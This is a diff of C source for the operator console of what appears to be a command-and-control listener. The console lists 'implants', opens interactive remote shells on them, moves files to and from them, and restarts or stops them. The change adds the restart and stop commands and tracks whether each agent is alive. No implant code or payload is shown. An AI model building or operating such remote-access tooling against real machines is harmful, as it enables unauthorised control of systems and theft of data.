@@ -36,7 +36,7 @@ extern volatile sig_atomic_t shell_sigint;
 extern volatile sig_atomic_t shell_flag;
 
 #define MENU "Provide an option.\n1 - list active agents\n2 - select active agent\n9 - exit\n"
-#define AGENT_MENU "Implant %d selected.\nProvide an option.\n1 - interactive shell\n2 - put file\n3 - get file\n4 - stop agent\n5 - go back\n"
+#define AGENT_MENU "Implant %d selected.\nProvide an option.\n1 - interactive shell\n2 - put file\n3 - get file\n4 - restart shell\n5 - stop agent\n6 - go back\n"
 
 STATIC int shell_console(int agent_fd){
 	int retval;
@@ -51,7 +51,7 @@ STATIC int shell_console(int agent_fd){
 	shell_flag = true;
 	while (!shell_sigint){
 
-		tv.tv_sec = SELECT_TIMEOUT;
+		tv.tv_sec = S_TIMEOUT;
 		tv.tv_usec = 0;
 		FD_ZERO(&console_fds);
 		FD_SET(STDIN, &console_fds);
@@ -91,7 +91,7 @@ STATIC int get_file_command(int agent_fd){
 	int file_name_size;
 	char* file_name_buffer;
 
-	print_out("%s\n", "File name");
+	print_out("%s", "File name");
 	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
 		printf("ERROR fgets\n");
 		return RET_ERROR;
@@ -117,7 +117,7 @@ STATIC int put_file_command(int agent_fd){
 	int file_size, file_name_size, bytes_read;
 	char *file_buffer, *file_name_buffer;
 
-	print_out("%s\n", "Source file");
+	print_out("%s", "Source file");
 	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
 		printf("ERROR fgets\n");
 		return RET_ERROR;
@@ -157,7 +157,7 @@ STATIC int put_file_command(int agent_fd){
 	
 	fclose(file_fd);
 
-	print_out("%s\n", "Destination file (default is current directory)");
+	print_out("%s", "Destination file (default is current directory)");
 	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
 		printf("fgets error\n");
 		return RET_ERROR;
@@ -178,7 +178,7 @@ STATIC int put_file_command(int agent_fd){
 	return RET_OK;
 }
 
-STATIC int agent_console(int agent_fd){
+STATIC int agent_console(Agent* agent, int agent_fd){
 	int retval;
 	char opt_buf[PAYLOAD_SIZE];
 	long option;
@@ -187,8 +187,8 @@ STATIC int agent_console(int agent_fd){
 
 	print_out(AGENT_MENU, agent_fd);
 				 
-	while(!all_sigint){
-		tv.tv_sec = SELECT_TIMEOUT;
+	while(!all_sigint && agent->alive){
+		tv.tv_sec = S_TIMEOUT;
     	tv.tv_usec = 0;
     	FD_ZERO(&console_fds);
     	FD_SET(STDIN, &console_fds);
@@ -208,24 +208,34 @@ STATIC int agent_console(int agent_fd){
 			option = strtol(opt_buf, NULL, 10);
 			switch(option){
 				case 1:
+					// console
 					if (shell_console(agent_fd) != RET_OK){
 						return RET_ERROR;
 					}
 					break;
 				case 2:
+					// put file
 					if (put_file_command(agent_fd) != RET_OK){
 						return RET_ERROR;
 					}
 					break;
 				case 3:
+					// get file
 					if (get_file_command(agent_fd) != RET_OK){
 						return RET_ERROR;
 					}
 					break;
 				case 4:
+					// restart shell
+					listener_prepare_message(agent_fd, TYPE_RESTART_SHELL, NULL, 0);
 					break;
 				case 5:
-					return 0;
+					// close agent
+					listener_prepare_message(agent_fd, TYPE_CLOSE_AGENT, NULL, 0);
+					return RET_OK;
+				case 6:
+					// back
+					return RET_OK;
 				default:
 					print_out("%s\n", "Unknown option selected");
 					break;
@@ -257,7 +267,7 @@ void *console_thread(void *vargp){
 	print_out("%s", MENU);
 	while(!all_sigint){
 		
-		tv.tv_sec = SELECT_TIMEOUT;
+		tv.tv_sec = S_TIMEOUT;
     	tv.tv_usec = 0;
     	FD_ZERO(&console_fds);
     	FD_SET(STDIN, &console_fds);
@@ -295,7 +305,7 @@ void *console_thread(void *vargp){
 					fgets(buffer, PAYLOAD_SIZE, stdin);
 					option = strtol(buffer, NULL, 10);
 					if (CA->agents[option].alive){
-						agent_console(option);
+						agent_console(&CA->agents[option], option);
 					}
 					else{
 						printf("agent dead\n");
